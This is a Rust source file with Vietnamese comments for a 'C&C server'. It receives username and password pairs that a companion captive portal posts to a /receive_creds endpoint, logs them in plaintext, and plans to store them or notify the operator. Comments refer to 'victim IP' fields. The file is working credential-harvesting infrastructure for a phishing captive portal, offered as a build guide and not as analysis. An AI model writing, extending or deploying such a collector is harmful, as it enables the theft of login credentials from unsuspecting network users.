// File: cnc_server/src/main.rs

// Import các thư viện cần thiết cho C&C server
use axum::{
    routing::post,
    Json, // Để nhận dữ liệu JSON
    Router,
    serve,
    response::IntoResponse,
    http::StatusCode,
};
use tokio::net::TcpListener; // Để lắng nghe kết nối TCP
use std::net::SocketAddr; // Để định nghĩa địa chỉ IP và port
use serde::Deserialize; // Để deserialize JSON nhận được
use log::{info, warn, error}; // Import các mức log

// Struct mô tả cấu trúc dữ liệu JSON mà C&C server mong đợi nhận được
// Cấu trúc này cần KHỚP với struct CredsForCnc (hoặc tương đương) mà captive portal gửi đi
#[derive(Deserialize, Debug)] // Derive Debug để có thể in chi tiết struct này
struct Credential {
    // Các field cần khớp với tên và kiểu dữ liệu từ phía gửi (captive portal)
    username: String,
    password: String,
    // Thêm các field khác nếu captive portal gửi đi (và bạn muốn nhận)
    // #[serde(default)] // Dùng nếu field là tùy chọn và không phải lúc nào cũng có
    // victim_ip: Option<String>,
    // #[serde(default)]
    // user_agent: Option<String>,
}


#[tokio::main]
async fn main() {
    // Khởi tạo logger. env_logger đọc biến môi trường RUST_LOG.
    // Nếu RUST_LOG không được set, mặc định sẽ chỉ hiển thị mức Error và cao hơn.
    // Chúng ta sẽ hướng dẫn cách set RUST_LOG=info để hiển thị info log.
    env_logger::init();

    info!("Đang khởi tạo C&C Server..."); // Log khi bắt đầu khởi tạo

    // Xây dựng router cho C&C server
    let app = Router::new()
        // Định nghĩa endpoint POST /receive_creds
        // Khi nhận được POST request tại /receive_creds, Axum sẽ gọi hàm receive_credentials_handler
        // và tự động parse body JSON thành struct Credential.
        .route("/receive_creds", post(receive_credentials_handler));

    // Địa chỉ IP và port mà C&C server sẽ lắng nghe
    let addr = SocketAddr::from(([127, 0, 0, 1], 3001)); // Lắng nghe trên localhost port 3001
    
    // Tạo listener để lắng nghe các kết nối đến địa chỉ đã định
    let listener = match TcpListener::bind(&addr).await {
        Ok(listener) => {
            info!("C&C Server đang lắng nghe tại http://{}", addr); // Log địa chỉ lắng nghe
            listener // Trả về listener nếu thành công
        }
        Err(e) => {
            error!("Không thể liên kết tới địa chỉ {}: {}", addr, e); // Log lỗi nếu không liên kết được
            // panic!("Server không thể khởi động!"); // Thoát chương trình nếu lỗi nghiêm trọng
            // Hoặc bạn có thể xử lý lỗi theo cách khác tùy ý
            std::process::exit(1); // Thoát với mã lỗi 1
        }
    };


    // Bắt đầu phục vụ ứng dụng web bằng listener
    // serve trả về Future, cần .await để chờ server chạy xong (hoặc lỗi)
    if let Err(e) = serve(listener, app).await {
        error!("Server gặp lỗi trong khi chạy: {}", e); // Log lỗi nếu server dừng đột ngột
    }
    
    info!("C&C Server đã dừng."); // Log khi server dừng lại
}

// Handler để xử lý request POST đến /receive_creds
// Json(credentials): Axum cố gắng deserialize body của request thành struct Credential.
// Nếu thành công, nó gán kết quả vào biến credentials.
async fn receive_credentials_handler(
    // Nếu bạn muốn lấy IP của client (ở đây là captive portal server) gửi request đến,
    // bạn cần cấu hình Axum trong main để lấy ConnectInfo.
    // axum::extract::ConnectInfo(client_addr): axum::extract::ConnectInfo<SocketAddr>,
    Json(credentials): Json<Credential> // Nhận dữ liệu JSON đăng nhập
) -> impl IntoResponse {
    // Log thông tin đăng nhập nhận được
    info!("Đã nhận được thông tin đăng nhập:");
    info!("Username: {}", credentials.username);
    info!("Password: {}", credentials.password);
    // if let Some(ip) = credentials.victim_ip { // Ví dụ log thêm field tùy chọn
    //     info!("Victim IP: {}", ip);
    // }

    // TODO: Lưu dữ liệu đăng nhập này vào database của C&C server
    // (Đây là database riêng của C&C, khác với database trên captive portal)
    // Hoặc xử lý dữ liệu theo cách khác (ví dụ: gửi thông báo cho bạn)
    info!("Thông tin đăng nhập đã được xử lý (hiện tại chỉ in ra).");

    // Trả về HTTP status code 200 OK để thông báo cho client (captive portal) rằng dữ liệu đã được nhận thành công
    StatusCode::OK
}
